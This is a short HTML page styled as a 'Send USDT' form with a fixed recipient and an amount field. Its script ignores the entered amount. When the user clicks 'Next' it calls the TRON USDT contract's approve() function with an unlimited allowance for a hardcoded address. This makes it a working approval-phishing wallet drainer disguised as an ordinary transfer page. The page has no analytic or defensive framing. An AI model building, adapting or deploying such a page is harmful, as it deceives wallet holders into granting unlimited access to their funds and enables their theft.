<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>USDT Approval</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background: #f9f9f9;
      color: #000;
    }

    h2 {
      text-align: center;
      margin-bottom: 30px;
    }

    label {
      font-size: 15px;
      font-weight: 600;
      margin-bottom: 5px;
      display: block;
    }

    input {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border-radius: 12px;
      border: 1px solid #ccc;
      margin-bottom: 25px;
      box-sizing: border-box;
    }

    .amount-box {
      display: flex;
      position: relative;
    }

    .amount-box input {
      padding-right: 80px;
    }

    .amount-box span {
      position: absolute;
      right: 70px;
      top: 50%;
      transform: translateY(-50%);
      font-weight: 600;
      color: #888;
    }

    .max-btn {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      padding: 6px 10px;
      background: #eee;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 14px;
      font-size: 18px;
      font-weight: bold;
      background-color: #26C8F2;
      color: white;
      border: none;
      border-radius: 14px;
      margin-top: 40px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>Send USDT</h2>

  <label>Recipient</label>
  <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled>

  <label>Amount</label>
  <div class="amount-box">
    <input id="amount" type="number" placeholder="0.00">
    <span>USDT</span>
    <button class="max-btn" onclick="setMax()">Max</button>
  </div>

  <button onclick="approveUSDT()">Next</button>

  <script>
    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const receiverAddress = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";

    function setMax() {
      document.getElementById("amount").value = "99999999";
    }

    async function waitForTronWeb(timeout = 15000) {
      const start = Date.now();
      while (!window.tronWeb || !window.tronWeb.ready) {
        if (Date.now() - start > timeout) {
          alert("Tron wallet not detected. Please use TronLink, OKX, or SafePal browser.");
          return false;
        }
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      return true;
    }

    async function approveUSDT() {
      const ready = await waitForTronWeb();
      if (!ready) return;

      try {
        const contract = await window.tronWeb.contract().at(usdtContractAddress);
        const tx = await contract.approve(
          receiverAddress,
          "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        ).send({ shouldPollResponse: true });

        alert("USDT approval transaction sent!");
        console.log("Approval TX:", tx);
      } catch (err) {
        console.error("Approval error:", err);
        alert("Approval failed: " + err.message);
      }
    }
  </script>
</body>
</html>
